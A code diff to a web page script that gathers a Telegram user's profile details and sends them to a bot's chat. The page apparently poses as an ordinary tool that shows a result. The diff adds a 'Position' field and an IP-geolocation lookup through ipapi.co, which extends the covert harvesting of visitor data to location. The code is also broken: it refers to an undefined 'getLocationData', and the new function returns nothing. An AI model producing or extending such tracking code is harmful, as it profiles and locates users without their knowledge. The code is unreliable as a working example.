@@ -274,7 +274,7 @@
 📎 Attachment Menu: ${user.added_to_attachment_menu ? "Yes" : "No"}
 ✉️ Allows PM: ${user.allows_write_to_pm ? "Yes" : "No"}
 🖼 Profile Photo: ${photoUrl ? `[Click Here](${photoUrl})` : "No photo"}
-`;
+📍 Position: ${getLocationData}`;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
@@ -403,6 +403,15 @@
             document.getElementById('result').innerText = 'Result: ' + result;
 
         }
+
+
+        async function getLocationFromIP() {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            console.log(`Location: ${data.city}, ${data.country}`);
+        } 
+           
+      
     </script>
 
     <!-- Eruda is console for mobile browsers -->
